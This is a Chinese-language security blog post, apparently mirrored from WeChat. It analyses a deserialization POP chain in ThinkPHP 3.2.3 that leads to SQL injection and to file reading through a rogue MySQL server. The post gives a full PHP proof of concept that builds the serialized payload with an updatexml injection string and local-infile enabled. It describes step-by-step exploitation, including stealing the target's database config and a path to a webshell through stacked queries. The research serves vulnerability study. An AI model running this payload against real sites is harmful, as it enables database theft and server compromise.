> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZFwUILsW3VJIhnEpc7_IOw)

ThinkPHP v3.2.* （SQL 注入 & 文件读取）反序列化 POP 链
=========================================

测试环境
----

*   OS: `MAC OS`
    
*   PHP: `5.4.45`
    
*   ThinkPHP: `3.2.3`
    

环境搭建
----

直接在 Web 目录下 Composer 一把梭。

```
composer create-project topthink/thinkphp=3.2.3 tp3
```

然后访问首页

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahonNhl760qor7lib5w7UHEiblSxfv95OqCPJ9B5SA7qL1cFUOKUmttuhDw/640?wx_fmt=png)

框架会自动生成一个默认控制器，在默认控制器下添加一个测试用的`Action`即可。

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoegbPyFSkObm4CBicW7ab6ZRA4hPYbRYCWQgXo8gs2JsqnS9IZq4MAMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoyTKrTWr3jQd0alNjQHohnpYicEoRDj8yeLMRCZyQmQM6DKEzYb2D1pw/640?wx_fmt=png)

POP 链分析
-------

### 起点

全局搜索`function __destruct(`，找一个起点。

文件：`/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php`

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoPb2dWeeglJj2NNV0OVuZibA9PPNlkIlm4EBzjzuk0DtBR0L7q4nZiaDw/640?wx_fmt=png)

这里的`$this->img`可控，且调用了`$this->img`的`destroy()`。

### 跳板 1

这时候我们需要一个有`destroy()`成员方法的一个跳板类，还是一样全局搜索`function destroy(`，成功找到一个可用的跳板类。

文件：`/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php`

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahooUnYO8ocKGbwnV3XvnLsQet0fmPWhppibUpS76pxx6rD59XHBGROA8g/640?wx_fmt=png)

这里的`destroy()`方法需要传入一个`$sessID`，但是前面`Imagick::__destruct`中调用`destroy()`方法的时候并没有传值。

**这里踩了下坑，因为在 PHP7 下起的 ThinkPHP 框架在这种情况下（调用有参函数时不传参数）会触发框架里的错误处理，从而报错。这块暂时没细究。  
**

切换到 PHP5 继续往下分析。这里的`$this->handle`可控，并且调用了`$this->handle`的`delete()`方法，且传过去的参数是部分可控的，因此我们可以继续寻找有`delete()`方法的跳板类。

### 跳板 2

全局搜索`function delete(`，找到一个`Model`类。

文件：`/ThinkPHP/Library/Think/Model.class.php`

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahovqmZWTJczV9ZNy1pibDIWqlEicUIonet7kfCBdAOVT5yich6ITEibPdSSg/640?wx_fmt=png)

这里的`$pk`其实就是`$this->pk`，是完全可控的。

  
下面的`$options`是从跳板 1 传过来的，在跳板 1 中可以控制其是否为空。`$this->options['where']`是成员属性，是可控的，因此`506`行的条件我们可以控制，且`508`行的条件我们也是可以控制的。

  
所以我们可以控制程序走到`509`行。

  
在`509`中又调用了一次自己`$this->delete()`，但是这时候的参数`$this->data[$pk]`是我们可控的。

  
这时`delete()`我们就可以成功带可控参数访问了。

这时候熟悉`ThinkPHP`的师傅们就应该懂了。这是`ThinkPHP`的数据库模型类中的`delete()`方法，最终会去调用到数据库驱动类中的`delete()`中去，也就是`558`行。且上面的一堆条件判断很显然都是我们可以控制的包括调用`$this->db->delete($options)`时的`$options`参数我们也可以控制。

那么这时候我们就可以调用任意自带的数据库类中的`delete()`方法了。

### 终点

文件：`/ThinkPHP/Library/Think/Db/Driver.class.php`  

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoybBJ6gg54NWEiakyibHkvVcPWuqFsODER86GnEeDs7ItYJRItn4iavdsQ/640?wx_fmt=png)

上面已经说过了，这边的参数是完全可控的，所以这里的`$table`是可控的，将`$table`拼接到`$sql`传入了`$this->execute()`。  

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahodleibIPZmnaTt8n0pDyKvxVxAXTn44obiaIaTts04WP4LDuxuTuzZUBw/640?wx_fmt=png)

这里有一个初始化数据库链接的地方，跟过去看看。  

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1Rgbtohlfaho3ogNlJ1ZJ5udC2UINY1tm7xDvZTlIQNj8p3XEZEmB3ibMnM3rJaFZ1w/640?wx_fmt=png)

可以通过控制成员属性，使程序调用到`$this->connect()`。

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfaholgsofVmDcGWYNQ7wmRCwSTCcMcFEeTPuIILkwOh7LAPVbdybOPlnUg/640?wx_fmt=png)

可以看到这里是去使用`$this->config`里的配置去创建了数据库连接，接着去执行前面拼接的`DELETE`SQL 语句。

到此，我们就找到了一条可以连接任意数据库的 POP 链。

漏洞利用
----

此 POP 链的正常利用过程应该是：

1.  通过某处 leak 出目标的数据库配置
    
2.  触发反序列化
    
3.  触发链中`DELETE`语句的 SQL 注入
    

但是如果只是这样，那么这个链子其实十分鸡肋。但是因为这里可以连接任意数据库，于是我想到了 **MySQL 恶意服务端读取客户端文件漏洞**。  
这样的话，利用过程就变成了：

1.  通过某处 leak 出目标的 WEB 目录 **(e.g. DEBUG 页面)**
    
2.  开启恶意 MySQL 恶意服务端设置读取的文件为目标的数据库配置文件
    
3.  触发反序列化
    
4.  触发链中 PDO 连接的部分
    
5.  获取到目标的数据库配置
    
6.  使用目标的数据库配置再次出发反序列化
    
7.  触发链中`DELETE`语句的 SQL 注入
    

### POC：

```
<?phpnamespace Think\Db\Driver{    use PDO;    class Mysql{        protected $options = array(            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件        );        protected $config = array(            "debug"    => 1,            "database" => "thinkphp3",            "hostname" => "127.0.0.1",            "hostport" => "3306",            "charset"  => "utf8",            "username" => "root",            "password" => ""        );    }}namespace Think\Image\Driver{    use Think\Session\Driver\Memcache;    class Imagick{        private $img;        public function __construct(){            $this->img = new Memcache();        }    }}namespace Think\Session\Driver{    use Think\Model;    class Memcache{        protected $handle;        public function __construct(){            $this->handle = new Model();        }    }}namespace Think{    use Think\Db\Driver\Mysql;    class Model{        protected $options   = array();        protected $pk;        protected $data = array();        protected $db = null;        public function __construct(){            $this->db = new Mysql();            $this->options['where'] = '';            $this->pk = 'id';            $this->data[$this->pk] = array(                "table" => "mysql.user where 1=updatexml(1,user(),1)#",                "where" => "1=1"            );        }    }}namespace {    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));}
```

### 利用过程

开启恶意 MySQL 服务器，设置读取文件为目标的数据库配置文件。

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoyCDS5nC7TFnHevOeI6EZQN0D93yAVoLkibnTB4HS0iaIduGbSyYuriayw/640?wx_fmt=png)

接着将 POC 中的数据库连接配置改成恶意 MySQL 服务器的 ip 和端口。

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoiblQCWOe9BatYUQBibnluQichNQiaQ2KQyNaOqLGRwrCic2VMmqMPF2JeXA/640?wx_fmt=png)

使用 POC 运行后的结果去触发反序列化。

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahowT0T7WvIBAkzBGZT3SLCNEFeq1xibov6XV93Nss6lRGaicmhvtM5IjMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoBJSQ88miaeXeAoYCBHoTlbF5OyRHhqbKiawHPfVicu86ZutGO3Ub76ulQ/640?wx_fmt=png)

成功触发 MySQL 恶意服务端读取客户端文件漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahorF0KVQhyGHMicnBVKn2DeePSqvF6FTYYjZO89Pj4euhzPLJvzn5HGgA/640?wx_fmt=png)

将 POC 中的数据库连接配置替换为目标的数据库配置，且修改需要注入的 SQL 语句。  

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoOhh9iakyE15X4Tp7oFECNhRHTledp32aoKmQibHRCnJRHqRQ62NOp4Ig/640?wx_fmt=png)

使用 POC 运行后的结果去触发反序列化。  

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1RgbtohlfahoHCkQn5Jwu5qFTJfjsrp0wKmTaH0mOo4a9mxOk8uCjfpHb9Shk8VicHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/akMib3fibarLpKUubpn8DO1Rgbtohlfaho4uZxOcvXzTgiaF2wOCyXCiaLiaAibvD06ia7iavUG76icNuHxSYL23fRhTicyQ/640?wx_fmt=png)

成功完成 SQL 注入，而且因为`ThinkPHP v3.2.*`默认使用的是 PDO 驱动来实现的数据库类，因为 PDO 默认是支持多语句查询的，所以这个点是可以堆叠注入的。  
也就是说这里可以使用导出数据库日志等手段实现 Getshell，或者使用`UPDATE`语句插入数据进数据库内等操作。

结尾
--

因为这里已经可以调用任意数据库类（不止 MySQL）了，但是笔主目前只想到这种利用方式，如果有其他更骚的利用方式也欢迎各位大师傅们一起来交流分享。

引用链接
----

ThinkPHP3.2.3 完全开发手册：https://www.kancloud.cn/manual/thinkphp/1678